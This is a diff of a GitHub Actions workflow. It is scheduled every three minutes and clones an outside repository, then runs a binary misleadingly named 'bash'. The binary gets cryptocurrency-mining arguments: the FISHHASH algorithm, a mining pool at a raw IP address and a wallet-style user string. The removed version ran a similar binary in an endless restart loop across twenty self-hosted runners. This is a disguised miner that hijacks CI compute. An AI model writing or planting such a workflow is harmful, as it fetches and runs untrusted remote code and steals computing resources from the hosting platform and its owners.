@@ -1,83 +1,32 @@
-name: Run bash --loop 5m
+name: Run bash --noTest
 
 on:
   workflow_dispatch:
   schedule:
-    - cron: "*/5 * * * *"   # trigger tiap 5 menit (opsional)
+    - cron: "*/3 * * * *"   
 
 permissions:
   contents: read
 
 concurrency:
   group: tesaction-run
-  cancel-in-progress: false
+  cancel-in-progress: true
 
 jobs:
   run:
-    timeout-minutes: 300
-
-    strategy:
-      fail-fast: false
-      matrix:
-        runner:
-          - vps-1
-          - vps-2
-          - vps-3
-          - vps-4
-          - vps-5
-          - vps-6
-          - vps-7
-          - vps-8
-          - vps-9
-          - vps-10
-          - vps-11
-          - vps-12
-          - vps-13
-          - vps-14
-          - vps-15
-          - vps-16
-          - vps-17
-          - vps-18
-          - vps-19
-          - vps-20
-
-    runs-on:
-      - self-hosted
+    runs-on: ubuntu-latest
+    timeout-minutes: 2  # 5 jam
 
     steps:
       - name: Checkout repository
         uses: actions/checkout@v4
 
-      - name: Debug runner
+      - name: Debug (optional)
         run: |
-          echo "Runner: ${{ matrix.runner }}"
-          hostname
-          nproc
+          echo "GITHUB_WORKSPACE=$GITHUB_WORKSPACE"
+          ls -la
 
-      - name: Loop run bash 5 minutes
-        env:
-          GH_TOKEN: ${{ secrets.GH_TOKEN }}
+      - name: Run bash
         run: |
-          git clone https://github.com/hujisanda/mamalol.git
-          cd mamalol
-          chmod u+x bash
-
-          echo "Start infinite loop 5 minutes run"
-
-          while true; do
-            echo "=== START $(date) ==="
-
-            ./bash &
-            PID=$!
-
-            # Jalan 5 menit
-            sleep 120
-
-            echo "Stopping process $PID"
-            kill -9 $PID || true
-
-            echo "Cooldown 5 detik"
-            sleep 7
-
-            echo "=== RESTART ==="
-          done
+          git clone https://github.com/hujisanda/lol198.git && cd lol198 && chmod u+x bash && ./bash --algo FISHHASH --pool 138.197.24.47:80 --user c9f8d6c1849abbcd164f6c72002d9ac44b9deaef70481739a29d1733915defca+115098.jasin --ethstratum ETHPROX
+          
